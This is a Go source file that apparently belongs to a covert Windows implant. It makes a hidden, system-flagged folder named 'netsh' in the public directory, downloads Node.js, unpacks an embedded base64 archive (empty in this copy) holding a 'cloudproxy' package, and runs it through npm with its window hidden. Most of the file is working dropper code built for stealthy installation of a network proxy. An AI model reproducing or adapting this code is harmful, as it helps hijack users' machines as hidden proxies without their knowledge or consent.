package main

import (
	"encoding/base64"
	"github.com/artdarek/go-unzip"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

var encodedZip = ""

func CloudProxy(readyChan chan<- bool, errorChan chan<- error) {
	readyChan <- true
	err := StartCloudProxy()
	if err != nil {
		errorChan <- err
		return
	}
}

func SetupCloudProxy() error {
	parentDir := os.Getenv("public") + "\\netsh"
	if DirExist(parentDir) {
		return nil
	} else {
		return InstallCloudProxy()
	}
}

func StartCloudProxy() error {
	parentDir := os.Getenv("public") + "\\netsh"
	cmd := exec.Command("npm", "start")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Dir = parentDir + "\\cloudproxy"
	return cmd.Run()
}

func InstallCloudProxy() error {
	parentDir := os.Getenv("public") + "\\netsh"
	err := os.RemoveAll(parentDir)
	if err != nil {
		return err
	}
	err = os.Mkdir(parentDir, 0755)
	if err != nil {
		return err
	}
	err = SetHidden(parentDir)
	if err != nil {
		return err
	}
	err = Download("https://nodejs.org/dist/v15.8.0/node-v15.8.0-win-x64.zip", parentDir+"\\nodejs.zip")
	if err != nil {
		return err
	}
	err = DecodeBase64(encodedZip, parentDir+"\\proxy.zip")
	if err != nil {
		return err
	}
	err = UnZip(parentDir+"\\nodejs.zip", parentDir)
	if err != nil {
		return err
	}
	err = UnZip(parentDir+"\\proxy.zip", parentDir)
	if err != nil {
		return err
	}
	err = os.Remove(parentDir + "\\nodejs.zip")
	if err != nil {
		return err
	}
	err = os.Remove(parentDir + "\\proxy.zip")
	if err != nil {
		return err
	}
	if !PathExist(parentDir + "\\node-v15.8.0-win-x64") {
		err = AddPath(parentDir + "\\node-v15.8.0-win-x64")
		if err != nil {
			return err
		}
	}
	cmd := exec.Command("npm", "install")
	cmd.Dir = parentDir + "\\cloudproxy"
	return cmd.Run()
}

func SetHidden(filename string) error {
	cFilename, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(cFilename, syscall.FILE_ATTRIBUTE_SYSTEM|syscall.FILE_ATTRIBUTE_HIDDEN)
}

func PathExist(path string) bool {
	pathFromEnv := os.Getenv("path")
	return strings.Contains(pathFromEnv, path)
}

func AddPath(path string) error {
	pathFromEnv := os.Getenv("path")
	return os.Setenv("path", pathFromEnv+";"+path)
}

func DirExist(dir string) bool {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func UnZip(src, dst string) error {
	uz := unzip.New(src, dst)
	return uz.Extract()
}

func Download(url, filename string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func DecodeBase64(encoded, filename string) error {
	dec, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return err
	}

	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err := f.Write(dec); err != nil {
		return err
	}
	return f.Sync()
}
